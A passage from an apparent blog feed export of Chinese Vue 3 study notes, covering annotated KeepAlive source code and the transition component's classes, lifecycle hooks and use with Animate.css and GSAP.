function_">_unmount</span>(vnode, instance, parentSuspense, <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">pruneCache</span>(<span class="params">filter?: (name: <span class="built_in">string</span>) =&gt; <span class="built_in">boolean</span></span>) &#123;</span><br><span class="line">      cache.<span class="title function_">forEach</span>(<span class="function">(<span class="params">vnode, key</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> name = <span class="title function_">getComponentName</span>(vnode.<span class="property">type</span> <span class="keyword">as</span> <span class="title class_">ConcreteComponent</span>)</span><br><span class="line">        <span class="keyword">if</span> (name &amp;&amp; (!filter || !<span class="title function_">filter</span>(name))) &#123;</span><br><span class="line">          <span class="title function_">pruneCacheEntry</span>(key)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">pruneCacheEntry</span>(<span class="params">key: CacheKey</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> cached = cache.<span class="title function_">get</span>(key) <span class="keyword">as</span> <span class="title class_">VNode</span></span><br><span class="line">      <span class="keyword">if</span> (!current || !<span class="title function_">isSameVNodeType</span>(cached, current)) &#123;</span><br><span class="line">        <span class="title function_">unmount</span>(cached)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (current) &#123;</span><br><span class="line">        <span class="comment">// current active instance should no longer be kept-alive.</span></span><br><span class="line">        <span class="comment">// we can&#x27;t unmount it now but it might be later, so reset its flag now.</span></span><br><span class="line">        <span class="title function_">resetShapeFlag</span>(current)</span><br><span class="line">      &#125;</span><br><span class="line">      cache.<span class="title function_">delete</span>(key)</span><br><span class="line">      keys.<span class="title function_">delete</span>(key)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prune cache on include/exclude prop change</span></span><br><span class="line">    <span class="title function_">watch</span>(</span><br><span class="line">      <span class="function">() =&gt;</span> [props.<span class="property">include</span>, props.<span class="property">exclude</span>],</span><br><span class="line">      <span class="function">(<span class="params">[include, exclude]</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// props是响应式的，所以需要监听它的值，监听到变化时，这个操作再做一遍</span></span><br><span class="line">        include &amp;&amp; <span class="title function_">pruneCache</span>(<span class="function"><span class="params">name</span> =&gt;</span> <span class="title function_">matches</span>(include, name))</span><br><span class="line">        exclude &amp;&amp; <span class="title function_">pruneCache</span>(<span class="function"><span class="params">name</span> =&gt;</span> !<span class="title function_">matches</span>(exclude, name))</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// prune post-render after `current` has been updated</span></span><br><span class="line">      &#123; <span class="attr">flush</span>: <span class="string">&#x27;post&#x27;</span>, <span class="attr">deep</span>: <span class="literal">true</span> &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cache sub tree after render</span></span><br><span class="line">    <span class="comment">// 挂载完后才会对pendingCacheKey进行赋值</span></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">pendingCacheKey</span>: <span class="title class_">CacheKey</span> | <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line">    <span class="comment">// 缓存函数</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">cacheSubtree</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">      <span class="comment">// fix #1621, the pendingCacheKey could be 0</span></span><br><span class="line">      <span class="keyword">if</span> (pendingCacheKey != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// pendingCacheKey不为null时，把要缓存的组件存到缓存map里（第一次不执行）</span></span><br><span class="line">        cache.<span class="title function_">set</span>(pendingCacheKey, <span class="title function_">getInnerChild</span>(instance.<span class="property">subTree</span>))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 首先在组件的onMounted或onUpdated钩子中设置缓存</span></span><br><span class="line">    <span class="comment">// 因为pendingCacheKey是在keep-alive的render函数中赋值，所以首次不缓存</span></span><br><span class="line">    <span class="comment">// 当render完成后，pendingCacheKey就会赋值</span></span><br><span class="line">    <span class="title function_">onMounted</span>(cacheSubtree)</span><br><span class="line">    <span class="title function_">onUpdated</span>(cacheSubtree)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">onBeforeUnmount</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      cache.<span class="title function_">forEach</span>(<span class="function"><span class="params">cached</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; subTree, suspense &#125; = instance</span><br><span class="line">        <span class="keyword">const</span> vnode = <span class="title function_">getInnerChild</span>(subTree)</span><br><span class="line">        <span class="keyword">if</span> (cached.<span class="property">type</span> === vnode.<span class="property">type</span> &amp;&amp; cached.<span class="property">key</span> === vnode.<span class="property">key</span>) &#123;</span><br><span class="line">          <span class="comment">// current instance will be unmounted as part of keep-alive&#x27;s unmount</span></span><br><span class="line">          <span class="title function_">resetShapeFlag</span>(vnode)</span><br><span class="line">          <span class="comment">// but invoke its deactivated hook here</span></span><br><span class="line">          <span class="keyword">const</span> da = vnode.<span class="property">component</span>!.<span class="property">da</span></span><br><span class="line">          da &amp;&amp; <span class="title function_">queuePostRenderEffect</span>(da, suspense)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">unmount</span>(cached)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回一个渲染函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      pendingCacheKey = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!slots.<span class="property">default</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 读取插槽的子节点，只渲染单个组件，如果多了会报错（所以不能用v-show）</span></span><br><span class="line">      <span class="keyword">const</span> children = slots.<span class="title function_">default</span>()</span><br><span class="line">      <span class="keyword">const</span> rawVNode = children[<span class="number">0</span>]</span><br><span class="line">      <span class="keyword">if</span> (children.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(<span class="string">`KeepAlive should contain exactly one component child.`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        current = <span class="literal">null</span></span><br><span class="line">        <span class="keyword">return</span> children</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">        !<span class="title function_">isVNode</span>(rawVNode) ||</span><br><span class="line">        (!(rawVNode.<span class="property">shapeFlag</span> &amp; <span class="title class_">ShapeFlags</span>.<span class="property">STATEFUL_COMPONENT</span>) &amp;&amp;</span><br><span class="line">          !(rawVNode.<span class="property">shapeFlag</span> &amp; <span class="title class_">ShapeFlags</span>.<span class="property">SUSPENSE</span>))</span><br><span class="line">      ) &#123;</span><br><span class="line">        current = <span class="literal">null</span></span><br><span class="line">        <span class="comment">// 最后返回的还是组件本身，keep-alive只是一个抽象组件，本身不会被渲染</span></span><br><span class="line">        <span class="keyword">return</span> rawVNode</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> vnode = <span class="title function_">getInnerChild</span>(rawVNode)</span><br><span class="line">      <span class="keyword">const</span> comp = vnode.<span class="property">type</span> <span class="keyword">as</span> <span class="title class_">ConcreteComponent</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// for async components, name check should be based in its loaded</span></span><br><span class="line">      <span class="comment">// inner component if available</span></span><br><span class="line">      <span class="keyword">const</span> name = <span class="title function_">getComponentName</span>(</span><br><span class="line">        <span class="title function_">isAsyncWrapper</span>(vnode)</span><br><span class="line">          ? (vnode.<span class="property">type</span> <span class="keyword">as</span> <span class="title class_">ComponentOptions</span>).<span class="property">__asyncResolved</span> || &#123;&#125;</span><br><span class="line">          : comp</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> &#123; include, exclude, max &#125; = props</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果include不包含子组件名称，或exclude包含组件名称，就不缓存，直接返回</span></span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        (include &amp;&amp; (!name || !<span class="title function_">matches</span>(include, name))) ||</span><br><span class="line">        (exclude &amp;&amp; name &amp;&amp; <span class="title function_">matches</span>(exclude, name))</span><br><span class="line">      ) &#123;</span><br><span class="line">        current = vnode</span><br><span class="line">        <span class="keyword">return</span> rawVNode</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> key = vnode.<span class="property">key</span> == <span class="literal">null</span> ? comp : vnode.<span class="property">key</span></span><br><span class="line">      <span class="keyword">const</span> cachedVNode = cache.<span class="title function_">get</span>(key)</span><br><span class="line"></span><br><span class="line">      <span class="comment">// clone vnode if it&#x27;s reused because we are going to mutate it</span></span><br><span class="line">      <span class="keyword">if</span> (vnode.<span class="property">el</span>) &#123;</span><br><span class="line">        vnode = <span class="title function_">cloneVNode</span>(vnode)</span><br><span class="line">        <span class="keyword">if</span> (rawVNode.<span class="property">shapeFlag</span> &amp; <span class="title class_">ShapeFlags</span>.<span class="property">SUSPENSE</span>) &#123;</span><br><span class="line">          rawVNode.<span class="property">ssContent</span> = vnode</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// #1513 it&#x27;s possible for the returned vnode to be cloned due to attr</span></span><br><span class="line">      <span class="comment">// fallthrough or scopeId, so the vnode here may not be the final vnode</span></span><br><span class="line">      <span class="comment">// that is mounted. Instead of caching it directly, we store the pending</span></span><br><span class="line">      <span class="comment">// key and cache `instance.subTree` (the normalized vnode) in</span></span><br><span class="line">      <span class="comment">// beforeMount/beforeUpdate hooks.</span></span><br><span class="line">      <span class="comment">// Vnode的key作为缓存的key</span></span><br><span class="line">      pendingCacheKey = key</span><br><span class="line"></span><br><span class="line">      <span class="comment">// KeepAlive组件返回的函数中根据vnode对象的key去缓存中查找是否有已缓存的组件</span></span><br><span class="line">      <span class="comment">// 如果有缓存，继承组件实例，将用于描述组件的vnode对象标记为COMPONENT_KEPT_ALIVE</span></span><br><span class="line">      <span class="comment">// 这样渲染器就不会重新创建新的组件实例</span></span><br><span class="line">      <span class="comment">// 如果缓存不存在，则将vnode对象的key添加到keys集合中</span></span><br><span class="line">      <span class="keyword">if</span> (cachedVNode) &#123;</span><br><span class="line">        <span class="comment">// copy over mounted state</span></span><br><span class="line">        <span class="comment">// 已被缓存</span></span><br><span class="line">        vnode.<span class="property">el</span> = cachedVNode.<span class="property">el</span></span><br><span class="line">        vnode.<span class="property">component</span> = cachedVNode.<span class="property">component</span></span><br><span class="line">        <span class="comment">// 不用创建组件实例，继承缓存的组件即可</span></span><br><span class="line">        <span class="keyword">if</span> (vnode.<span class="property">transition</span>) &#123;</span><br><span class="line">          <span class="comment">// recursively update transition hooks on subTree</span></span><br><span class="line">          <span class="comment">// 如果组件上有动画，处理动画</span></span><br><span class="line">          <span class="title function_">setTransitionHooks</span>(vnode, vnode.<span class="property">transition</span>!)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// avoid vnode being mounted as fresh</span></span><br><span class="line">        <span class="comment">// 标记vnode不会重新渲染</span></span><br><span class="line">        vnode.<span class="property">shapeFlag</span> |= <span class="title class_">ShapeFlags</span>.<span class="property">COMPONENT_KEPT_ALIVE</span></span><br><span class="line">        <span class="comment">// make this key the freshest</span></span><br><span class="line">        <span class="comment">// key保持最新的</span></span><br><span class="line">        keys.<span class="title function_">delete</span>(key)</span><br><span class="line">        keys.<span class="title function_">add</span>(key)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 将vnode的key添加到keys中，keys集合用户维护缓存组件的key</span></span><br><span class="line">        keys.<span class="title function_">add</span>(key)</span><br><span class="line">        <span class="comment">// prune oldest entry</span></span><br><span class="line">        <span class="comment">// LRU算法（最近最少使用页面置换算法），把不活跃的key剔除</span></span><br><span class="line">        <span class="keyword">if</span> (max &amp;&amp; keys.<span class="property">size</span> &gt; <span class="built_in">parseInt</span>(max <span class="keyword">as</span> <span class="built_in">string</span>, <span class="number">10</span>)) &#123;</span><br><span class="line">          <span class="title function_">pruneCacheEntry</span>(keys.<span class="title function_">values</span>().<span class="title function_">next</span>().<span class="property">value</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// avoid vnode being unmounted</span></span><br><span class="line">      vnode.<span class="property">shapeFlag</span> |= <span class="title class_">ShapeFlags</span>.<span class="property">COMPONENT_SHOULD_KEEP_ALIVE</span></span><br><span class="line"></span><br><span class="line">      current = vnode</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">isSuspense</span>(rawVNode.<span class="property">type</span>) ? rawVNode : vnode</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>transition动画组件</title>
    <url>/web/study/Vue/21.transition%E5%8A%A8%E7%94%BB%E7%BB%84%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="transition"><a href="#transition" class="headerlink" title="transition"></a>transition</h1><p>transition组件可以给任何元素或组件添加进入&#x2F;离开的过渡，使用情形：</p>
<ul>
<li>条件渲染（v-if）</li>
<li>条件展示（v-show）</li>
<li>动态组件</li>
<li>组件根节点</li>
</ul>
<h1 id="类名"><a href="#类名" class="headerlink" title="类名"></a>类名</h1><h2 id="默认类名"><a href="#默认类名" class="headerlink" title="默认类名"></a>默认类名</h2><p>在进入&#x2F;离开的过渡中，会有6个class切换：</p>
<ol>
<li>v-enter-from：定义进入过渡的开始状态。在元素被插入之前生效，在元素被插入之后的下一帧移除。</li>
<li>v-enter-active：定义进入过渡生效时的状态。在整个进入过渡的阶段中应用，在元素被插入之前生效，在过渡&#x2F;动画完成之后移除。常用来定义进入过渡的过程时间，延迟和曲线函数。</li>
<li>v-enter-to：定义进入过渡的结束状态。在元素被插入之后下一帧生效 （与此同时v-enter-from被移除），在过渡&#x2F;动画完成之后移除。</li>
<li>v-leave-from：定义离开过渡的开始状态。在离开过渡被触发时立刻生效，下一帧被移除。</li>
<li>v-leave-active：定义离开过渡生效时的状态。在整个离开过渡的阶段中应用，在离开过渡被触发时立刻生效，在过渡&#x2F;动画完成之后移除。常用来定义离开过渡的过程时间，延迟和曲线函数。</li>
<li>v-leave-to：离开过渡的结束状态。在离开过渡被触发之后下一帧生效 （与此同时v-leave-from被移除），在过渡&#x2F;动画完成之后移除。</li>
</ol>
<p>为transition组件添加name属性，并在css中把上述类名的v替换成name属性值，再写入对应样式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;flag = !flag&quot;&gt;switch&lt;/button&gt;</span><br><span class="line">    &lt;transition name=&quot;fade&quot;&gt;</span><br><span class="line">      &lt;div v-if=&quot;flag&quot; class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/transition&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const flag = ref&lt;boolean&gt;(true)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: pink;</span><br><span class="line">&#125;</span><br><span class="line">// 进入前的状态</span><br><span class="line">.fade-enter-from &#123;</span><br><span class="line">  width: 0;</span><br><span class="line">  height: 0;</span><br><span class="line">  transform: rotate(360deg);</span><br><span class="line">&#125;</span><br><span class="line">// 进入时的过渡</span><br><span class="line">.fade-enter-active &#123;</span><br><span class="line">  transition: all 1s ease;</span><br><span class="line">&#125;</span><br><span class="line">// 进入结束的状态</span><br><span class="line">.fade-enter-to &#123;</span><br><span class="line">  // 最好和本身的样式保持一致</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">&#125;</span><br><span class="line">// 退出前的状态</span><br><span class="line">.fade-leave-from &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  transform: rotate(360deg);</span><br><span class="line">&#125;</span><br><span class="line">// 退出时的过渡</span><br><span class="line">.fade-leave-active &#123;</span><br><span class="line">  transition: all 1s ease;</span><br><span class="line">&#125;</span><br><span class="line">// 退出结束的状态</span><br><span class="line">.fade-leave-to &#123;</span><br><span class="line">  width: 0;</span><br><span class="line">  height: 0;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="自定义类名"><a href="#自定义类名" class="headerlink" title="自定义类名"></a>自定义类名</h2><p>为transition传prop：</p>
<ul>
<li>enter-from-class</li>
<li>enter-active-class</li>
<li>enter-to-class</li>
<li>leave-from-class</li>
<li>leave-active-class</li>
<li>leave-to-class</li>
</ul>
<p>例如设enter-from-class为”abc”，就能通过类名abc规定对应的动画过程了。</p>
<p>这样做更方便样式的复用，或结合第三方类库使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;transition enter-from-class=&quot;abc&quot; name=&quot;fade&quot;&gt;</span><br><span class="line">  &lt;div v-if=&quot;flag&quot; class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/transition&gt;</span><br><span class="line"></span><br><span class="line">// 省略......</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">// 进入前的状态</span><br><span class="line">.abc &#123;</span><br><span class="line">  // 省略......</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="结合Animate-css"><a href="#结合Animate-css" class="headerlink" title="结合Animate.css"></a>结合Animate.css</h1><p>自定义类名结合Animate.css动画库使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;flag = !flag&quot;&gt;switch&lt;/button&gt;</span><br><span class="line">    &lt;!-- duration：动画执行时间 --&gt;</span><br><span class="line">    &lt;!-- 传入一个数字，则进入和离开都遵循此时间（例 :duration=&quot;500&quot;） --&gt;</span><br><span class="line">    &lt;!-- 传入一个对象，则可对进入和离开单独定义（例 :duration=&quot;&#123;enter:250,leave:500&#125;&quot;） --&gt;</span><br><span class="line">    &lt;transition </span><br><span class="line">      leave-active-class=&quot;animate__animated animate__fadeOut&quot; </span><br><span class="line">      enter-active-class=&quot;animate__animated animate__fadeIn&quot;</span><br><span class="line">      :duration=&quot;&#123;enter:250,leave:500&#125;&quot;&gt;</span><br><span class="line">      &lt;div v-if=&quot;flag&quot; class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/transition&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">import &quot;animate.css&quot;</span><br><span class="line"></span><br><span class="line">const flag = ref&lt;boolean&gt;(true)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: pink;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><p>transition有八个生命周期：</p>
<ul>
<li><code>@before-enter=&quot;beforeEnter&quot;</code>：对应enter-from</li>
<li><code>@enter=&quot;enter&quot;</code>：对应enter-active</li>
<li><code>@after-enter=&quot;afterEnter&quot;</code>：对应enter-to</li>
<li><code>@enter-cancelled=&quot;enterCancelled&quot;</code>：显示过度打断</li>
<li><code>@before-leave=&quot;beforeLeave&quot;</code>：对应leave-from</li>
<li><code>@leave=&quot;leave&quot;</code>：对应enter-active</li>
<li><code>@after-leave=&quot;afterLeave&quot;</code>：对应leave-to</li>
<li><code>@leave-cancelled=&quot;leaveCancelled&quot;</code>：离开过度打断</li>
</ul>
<p>因为有一些复杂的过渡效果无法被CSS实现，必须动用JS，所以Vue提供了transition的生命周期。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;flag = !flag&quot;&gt;switch&lt;/button&gt;</span><br><span class="line">    &lt;!-- duration：动画执行时间 --&gt;</span><br><span class="line">    &lt;!-- 传入一个数字，则进入和离开都遵循此时间（例 :duration=&quot;500&quot;） --&gt;</span><br><span class="line">    &lt;!-- 传入一个对象，则可对进入和离开单独定义（例 :duration=&quot;&#123;enter:250,leave:500&#125;&quot;） --&gt;</span><br><span class="line">    &lt;transition </span><br><span class="line">      @before-enter=&quot;EnterFrom&quot;</span><br><span class="line">      @enter=&quot;EnterActive&quot;</span><br><span class="line">      @after-enter=&quot;EnterTo&quot;</span><br><span class="line">      @enter-cancelled=&quot;EnterCancel&quot;</span><br><span class="line">      @before-leave=&quot;LeaveFrom&quot;</span><br><span class="line">      @leave=&quot;LeaveActive&quot;</span><br><span class="line">      @after-leave=&quot;LeaveTo&quot;</span><br><span class="line">      @@leave-cancelled=&quot;LeaveCancel&quot;&gt;</span><br><span class="line">      &lt;div v-if=&quot;flag&quot; class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/transition&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">import &quot;animate.css&quot;</span><br><span class="line"></span><br><span class="line">const flag = ref&lt;boolean&gt;(true)</span><br><span class="line"></span><br><span class="line">// @param el 被过渡的元素</span><br><span class="line">const EnterFrom = (el: Element)=&gt; &#123;</span><br><span class="line">  console.log(&quot;进入前&quot;)</span><br><span class="line">&#125;</span><br><span class="line">// @param done 完成时执行的回调</span><br><span class="line">const EnterActive = (el: Element, done: Function)=&gt; &#123;</span><br><span class="line">  console.log(&quot;进入时&quot;)</span><br><span class="line">  // 进入动画三秒后完成</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    done()</span><br><span class="line">  &#125;, 3000)</span><br><span class="line">&#125;</span><br><span class="line">const EnterTo = (el: Element)=&gt; &#123;</span><br><span class="line">  console.log(&quot;进入完&quot;)</span><br><span class="line">&#125;</span><br><span class="line">const EnterCancel = (el: Element)=&gt; &#123;</span><br><span class="line">  console.log(&quot;打断进入&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const LeaveFrom = (el: Element)=&gt; &#123;</span><br><span class="line">  console.log(&quot;离开前&quot;)</span><br><span class="line">&#125;</span><br><span class="line">const LeaveActive = (el: Element, done: Function)=&gt; &#123;</span><br><span class="line">  console.log(&quot;离开时&quot;)</span><br><span class="line">  // 离开动画三秒后完成</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    done()</span><br><span class="line">  &#125;, 3000)</span><br><span class="line">&#125;</span><br><span class="line">const LeaveTo = (el: Element)=&gt; &#123;</span><br><span class="line">  console.log(&quot;离开完&quot;)</span><br><span class="line">&#125;</span><br><span class="line">const LeaveCancel = (el: Element)=&gt; &#123;</span><br><span class="line">  console.log(&quot;打断离开&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: pink;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="结合GSAP"><a href="#结合GSAP" class="headerlink" title="结合GSAP"></a>结合GSAP</h1><p>GSAP是一个JS动画库，可以结合transition组件的生命周期使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;flag = !flag&quot;&gt;switch&lt;/button&gt;</span><br><span class="line">    &lt;transition </span><br><span class="line">      @before-enter=&quot;EnterFrom&quot;</span><br><span class="line">      @enter=&quot;EnterActive&quot;</span><br><span class="line">      @leave=&quot;LeaveActive&quot;&gt;</span><br><span class="line">      &lt;div v-if=&quot;flag&quot; class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/transition&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">import gsap from &quot;gsap&quot;</span><br><span class="line"></span><br><span class="line">const flag = ref&lt;boolean&gt;(true)</span><br><span class="line"></span><br><span class="line">const EnterFrom = (el: Element)=&gt; &#123;</span><br><span class="line">  gsap.set(el, &#123;</span><br><span class="line">    width:0,</span><br><span class="line">    height:0</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">const EnterActive = (el: Element, done: gsap.Callback)=&gt; &#123;</span><br><span class="line">  gsap.to(el, &#123;</span><br><span class="line">    width:200,</span><br><span class="line">    height:200,</span><br><span class="line">    onComplete:done</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">const LeaveActive = (el: Element, done: gsap.Callback)=&gt; &#123;</span><br><span class="line">  gsap.to(el, &#123;</span><br><span class="line">    width:0,</span><br><span class="line">    height:0,</span><br><span class="line">    onComplete:done</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: pink;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="appear"><a href="#appear" class="headerlink" title="appear"></a>appear</h1><p>appear有三个属性：</p>
<ul>
<li>appear-from-class</li>
<li>appear-active-class</li>
<li>appear-to-class</li>
</ul>
<p>通过这些属性可以设置初始节点过渡，即页面加载完成就开始的动画。</p>
<p>但进入或离开的时候不会执行这些动画。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;flag = !flag&quot;&gt;switch&lt;/button&gt;</span><br><span class="line">    &lt;transition </span><br><span class="line">      appear</span><br><span class="line">      appear-from-class=&quot;from&quot;</span><br><span class="line">      appear-active-class=&quot;active&quot;</span><br><span class="line">      appear-to-class=&quot;to&quot;&gt;</span><br><span class="line">      &lt;div v-if=&quot;flag&quot; class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/transition&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const flag = ref&lt;boolean&gt;(true)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: pink;</span><br><span class="line">&#125;</span><br><span class="line">.from &#123;</span><br><span class="line">  width: 0px;</span><br><span class="line">  height: 0px;</span><br><span class="line">&#125;</span><br><span class="line">.active &#123;</span><br><span class="line">  transition: all 1s ease;</span><br><span class="line">&#125;</span><br><span class="line">.to &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>transition-group过渡列表</title>
    <url>/web/study/Vue/22.transition-group%E8%BF%87%E6%B8%A1%E5%88%97%E8%A1%A8.html</url>
